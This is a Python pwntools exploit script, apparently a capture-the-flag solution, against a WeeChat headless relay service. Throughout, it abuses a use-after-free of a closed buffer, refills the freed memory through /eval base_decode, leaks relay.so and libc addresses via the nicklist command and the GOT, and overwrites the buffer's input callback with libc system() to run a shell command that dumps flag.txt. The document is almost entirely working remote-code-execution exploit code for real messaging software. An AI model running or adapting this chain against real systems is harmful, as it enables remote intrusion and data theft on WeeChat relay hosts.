from pwn import *

context.binary = "weechat/bin/weechat-headless"
libc = ELF("libc.so.6")
relay = ELF("weechat/lib/weechat/plugins/relay.so")

io = remote("weechal.chal.hackthe.vote", 1337)
io.sendline(b"handshake compression=off")
io.sendline(b"init password=ctf")

io.sendline(b"input core.weechat /buffer add asdf")
io.sendline(b"infolist buffer")
io.sendline(b"input core.weechat /buffer close asdf")


def read_pointer():
    io.recvuntil(b"pointer")
    io.recvuntil(b"ptr")
    return int(io.recvn(u8(io.recvn(1))), 16)


core_weechat = read_pointer()
relay_buffer = read_pointer()
hole = read_pointer()
log.info(f"{relay_buffer=:#x}")
log.info(f"{hole=:#x}")


def fill_hole(*args):
    data = flat(*args, length=0x248 // 2 - 1, filler=p8(0))
    io.sendline(
        b"input core.weechat /eval ${base_decode:16," + data.hex().encode() + b"}"
    )


def leak(addr):
    fill_hole(
        {
            0x28: hole,  # full_name
            0xB8: hole + 0xC0,  # nicklist_root
            0xC0: [addr, hole, 1, 0, 0, 0, 0, 0, 0, 0, 0],
        }
    ),
    io.clean()
    io.sendline(f"nicklist {hole:#x}".encode())
    io.recvn(0x9E)
    return u64(io.recvn(8))


relay.address = leak(relay_buffer + 0x100) - relay.symbols["relay_buffer_input_cb"]
libc.address = leak(relay.symbols["got.ctime"]) - libc.symbols["ctime"]
log.info(f"{relay.address=:#x}")
log.info(f"{libc.address=:#x}")

fill_hole(
    {
        0x28: hole,  # full_name
        0x30: b"for fd in $(ls /proc/$$/fd); do cat flag.txt >&$fd; done",
        0x100: libc.symbols["system"],  # input_callback
        0x108: hole + 0x30,  # input_callback_pointer
    }
)
io.sendline(f"input {hole:#x} asdf".encode())
log.success(io.recvregex(b"(flag\{.*\})", capture=True)[1].decode())
